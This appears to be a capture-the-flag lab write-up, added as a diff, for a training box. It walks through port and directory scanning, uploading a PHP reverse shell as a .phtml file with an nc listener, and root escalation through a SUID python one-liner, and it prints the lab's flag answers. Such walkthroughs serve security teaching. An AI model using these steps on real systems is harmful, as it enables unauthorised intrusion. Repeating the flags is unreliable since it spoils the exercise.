@@ -1,0 +1,213 @@
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+                             RECONNAISSANCE
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+
+Q) Scan the machine, how many ports are open?
+    -> 2
+
+Q) What version of Apache is running?
+    -> 2.4.29
+
+Q) What service is running on port 22?
+    -> ssh
+
+T) Find directories on the web server using the GoBuster tool.
+
+Q) What is the hidden directory?
+    -> /panel/
+
+=============================== WORKING ========================================
+
+=-=-=-=-=-=-=-=-=-=-=
+    NMAP SCAN       =
+=-=-=-=-=-=-=-=-=-=-=
+
+───╼ $nmap -sV -A 10.10.230.180
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-10 01:58 PKT
+Nmap scan report for 10.10.230.180
+Host is up (0.44s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
+|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
+|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: HackIT - Home
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 69.63 seconds
+
+=-=-=-=-=-=-=-=-=-=-=
+    DIR BUSTING     =
+=-=-=-=-=-=-=-=-=-=-=
+
+───╼ $dirbuster 
+Oct 10, 2021 2:04:52 AM java.util.prefs.FileSystemPreferences$1 run
+INFO: Created user preferences directory.
+Starting OWASP DirBuster 1.0-RC1
+Starting dir/file list based brute forcing
+Dir found: / - 200
+Dir found: /js/ - 200
+File found: /js/maquina_de_escrever.js - 200
+Dir found: /icons/ - 403
+Dir found: /panel/ - 200
+
+
+================================================================================
+
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+                            GETTING A SHELL
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+
+
+Find a form to upload and get a reverse shell, and find the flag.
+
+Q) user.txt
+    -> THM{y0u_g0t_a_sh3ll}
+
+=============================== WORKING ========================================
+
+Using the same php reverse shell we used in vulnversity.
+(Git Link: https://github.com/pentestmonkey/php-reverse-shell)
+
+go to http://<machine-ip>/panel/
+
+upload your shell.phtml (remember to change the extension of your shell file to
+.phtml).
+
+It will be uploaded successfully. 
+
+Now run the following command on the terminal:
+───╼ $nc -lvnp 1234            - (Since I have configured the script for 
+                                 port 1234 )
+
+Now got http://<machine-ip>/uploads/
+
+There you will find your script file listed, click on it, now you will have a
+shell access in your terminal
+
+Now we need to find the file with name user.txt.
+
+Run the following command:
+───╼ $find / -type f -name user.txt
+    
+It will display a list of directories where it doesn't have permission
+to search, but amoung them you will find this:
+
+/var/www/user.txt
+    
+Read this file to obtain the file. Run the following command:
+
+───╼ $cat /var/www/user.txt    
+THM{y0u_g0t_a_sh3ll}
+
+================================================================================
+
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+                          PRIVILEGE ESCALATION
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+
+
+Q) Search for files with SUID permission, which file is weird?
+    -> /usr/bin/python
+
+T) Find a form to escalate your privileges.
+
+Q) root.txt
+    -> THM{pr1v1l3g3_3sc4l4t10n}
+
+
+=============================== WORKING ========================================
+
+Continuing with the shell access we obtained in the previous task.
+
+Lets search for file with SUID permission. Run the following command:
+
+───╼ $find / -perm -u=s -type f 2>/dev/null
+
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/bin/traceroute6.iputils
+/usr/bin/newuidmap
+/usr/bin/newgidmap
+/usr/bin/chsh
+/usr/bin/python
+/usr/bin/at
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/pkexec
+/snap/core/8268/bin/mount
+/snap/core/8268/bin/ping
+/snap/core/8268/bin/ping6
+/snap/core/8268/bin/su
+/snap/core/8268/bin/umount
+/snap/core/8268/usr/bin/chfn
+/snap/core/8268/usr/bin/chsh
+/snap/core/8268/usr/bin/gpasswd
+/snap/core/8268/usr/bin/newgrp
+/snap/core/8268/usr/bin/passwd
+/snap/core/8268/usr/bin/sudo
+/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/8268/usr/lib/openssh/ssh-keysign
+/snap/core/8268/usr/lib/snapd/snap-confine
+/snap/core/8268/usr/sbin/pppd
+/snap/core/9665/bin/mount
+/snap/core/9665/bin/ping
+/snap/core/9665/bin/ping6
+/snap/core/9665/bin/su
+/snap/core/9665/bin/umount
+/snap/core/9665/usr/bin/chfn
+/snap/core/9665/usr/bin/chsh
+/snap/core/9665/usr/bin/gpasswd
+/snap/core/9665/usr/bin/newgrp
+/snap/core/9665/usr/bin/passwd
+/snap/core/9665/usr/bin/sudo
+/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/9665/usr/lib/openssh/ssh-keysign
+/snap/core/9665/usr/lib/snapd/snap-confine
+/snap/core/9665/usr/sbin/pppd
+/bin/mount
+/bin/su
+/bin/fusermount
+/bin/ping
+/bin/umount
+
+Amoung these, the one that catches our attention is:
+
+/usr/bin/python
+
+Using the method on https://gtfobins.github.io/gtfobins/python/ for SUID:
+
+───╼ $/usr/bin/python -c 'import os; os.execl("/bin/bash", "sh", "-p")'
+
+Now should have root shell, try running the command:
+
+───╼ $whoami
+root            <-- Expected output
+
+Now read the file root.txt:
+
+───╼ $cat /root/root.txt
+THM{pr1v1l3g3_3sc4l4t10n}
+
+
+================================================================================
+
+
+
+
